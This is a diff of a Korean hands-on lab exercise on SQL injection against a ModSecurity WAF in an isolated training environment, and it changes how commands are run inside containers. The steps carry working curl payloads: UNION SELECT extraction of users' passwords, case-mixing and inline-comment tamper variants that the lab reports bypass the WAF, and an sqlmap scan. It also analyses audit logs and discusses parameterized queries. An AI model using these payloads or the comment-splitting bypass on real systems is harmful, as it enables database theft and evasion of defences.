@@ -12,7 +12,7 @@ description: |
   본인 공격이 942(SQLi)+949110(anomaly)으로 잡힌 흔적을 분석한다. 마지막으로 같은 payload 가 차단 모드
   (dvwa 403) vs 탐지 전용 모드(juice 200)로 갈리는 이유와 근본 방어(parameterized query)를 정리한다.
   공격 도구는 el34-attacker, 로그 확인은 el34-web. 명령은 모두 el34 호스트(ssh ccc@192.168.0.151)에서
-  docker exec 로 실행한다. 인가된 실습 환경에서만 수행한다.
+  실행하며, 컨테이너 작업은 docker exec -it <컨테이너> bash 로 접속해 수행한다. 인가된 실습 환경에서만 수행한다.
 difficulty: hard
 duration_minutes: 180
 prerequisites:
@@ -33,11 +33,14 @@ steps:
       모든 공격의 0단계는 "도구가 있고 대상에 닿는가" 확인이다. SQLi 자동화 도구 sqlmap 이
       attacker 컨테이너에 설치돼 있는지, 그리고 차단형 vhost(dvwa)에 네트워크로 도달하는지 본다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
-      docker exec el34-attacker sh -c 'command -v sqlmap'
+      command -v sqlmap
       # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
+      curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/
       ```
       - `command -v sqlmap`(설치 경로), `curl ... -H 'Host: dvwa.el34.lab'`(fw 게이트웨이로 보내되 dvwa vhost 지정), `-o /dev/null -w '%{http_code}'`(본문 버리고 코드만).
       ## ✅ 합격 기준
@@ -72,9 +75,12 @@ steps:
       다른 테이블(users 의 계정·비밀번호)을 이어 붙여 응답에 노출시키는 기법이다. 차단형 WAF(dvwa)가
       이 평문 SQLi 를 얼마나 쉽게 막는지 직접 확인한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
+      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-"
       # 2) 해석 — UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다
       echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
       ```
@@ -118,12 +124,15 @@ steps:
       키워드 사이 주석 분할을 못 복원해 **주석삽입은 실제로 우회(302)** 된다 — "정규화가 모든 변형을
       잡는다"는 통념이 깨지는 실측 사례다(우회 성공이 곧 더 강력한 교훈).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
-      K=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\"")
+      K=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--")
       echo "case=$K"
       # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
-      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\"")
+      C=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--")
       echo "comment=$C"
       # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
@@ -173,9 +182,12 @@ steps:
       `/rest/products/search?q=` 를 대상으로 한다(juice 는 W03 에서 본 API 구조). 자동화의 위력과
       동시에 "매우 시끄럽다"(다량 비정상 요청으로 WAF/IDS 에 다수 탐지)는 특성을 체감한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
-      docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
+      timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6
       # 2) 해석 — 자동 테스트는 빠르지만 다량 비정상 요청이라 매우 시끄러움(WAF/IDS 다수 탐지)
       echo "→ sqlmap이 파라미터를 자동 테스트(boolean/time/union/error). 빠르지만 매우 시끄러움"
       ```
@@ -218,9 +230,12 @@ steps:
       트랜잭션을 web 컨테이너의 modsec_audit.log 에 JSON 한 줄씩 남긴다. 앞 단계들에서 보낸 SQLi 가
       어떤 룰에 잡혔는지 룰 ID 를 집계해, 본인 공격이 정확히 SQLi 룰군(942)에 걸렸음을 검증한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
       ```bash
       # 1) modsec_audit 최근 150줄에서 942(SQLi)/949110(anomaly) 룰ID 집계 — 내 공격의 탐지 흔적
-      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+      sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c
       # 2) 해석 — 942xxx(SQLi 룰군)이 변형을 잡고 949110(anomaly 누적)에서 차단
       echo "→ 942xxx(SQLi 룰군)이 payload 변형을 잡고, 949110(anomaly 누적)에서 차단"
       ```
@@ -268,11 +283,14 @@ steps:
       log 에는 기록되되 막지만 않는 것임을 이해한다. 이는 버그가 아니라 운영 정책의 선택이다(새 룰을
       도입할 때 오탐 관찰을 위해 DetectionOnly 로 켰다가 안정되면 On 으로 전환).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 같은 SQLi payload를 dvwa(차단 모드)로 — 응답코드
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--"
       # 2) 같은 payload를 juice(DetectionOnly)로 — 응답코드
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--"
       # 3) 해석 — dvwa=403(차단)/juice=200(탐지만), 같은 공격 다른 결과 = WAF 정책 차이
       echo "→ dvwa=403(차단 모드), juice=200(DetectionOnly, 탐지만). 같은 공격, 다른 결과 = WAF 정책 차이"
       ```
